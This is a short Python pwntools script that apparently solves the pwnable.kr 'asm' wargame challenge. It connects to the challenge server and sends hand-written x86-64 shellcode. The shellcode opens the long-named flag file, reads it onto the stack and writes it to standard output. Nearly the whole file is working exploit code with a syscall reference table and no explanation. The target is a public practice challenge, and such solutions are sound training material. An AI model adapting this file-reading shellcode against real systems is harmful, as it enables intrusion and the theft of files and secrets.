#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64', os='linux')
p = remote('pwnable.kr', 9026)

'''
+-----+----------------+----------------------+-----------+----------+
| rax |  system call   |         rdi          |    rsi    |   rdx    |
+-----+----------------+----------------------+-----------+----------+
|  0  |    sys_read    |          fd          | char *buf |  count   |
|  1  |   sys_write    |          fd          | char *buf |  count   |
|  2  |    sys_open    | const char *filename | int flags | int mode |
|  60 | int error_code |                      |           |          |
+-----+----------------+----------------------+-----------+----------+
'''
shellcode = asm("""
        xor rax, rax
        xor rdi, rdi
        xor rsi, rsi
        xor rdx, rdx
        jmp flag
        open:
            pop rdi
            mov rax, 2
            syscall
        read:
            mov rdi,rax
            mov rsi, rsp
            mov rdx, 0x40
            xor rax, rax
            syscall
        write:
            mov rdi, 1
            mov rdx, 0x40
            mov rax, 1
            syscall
        exit:
            mov rax, 0x3c
            syscall
        flag:
            call open
            .ascii "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
            .byte 0
""")
p.recvuntil("give me your x64 shellcode:")
p.send(shellcode)
p.interactive()
p.close()
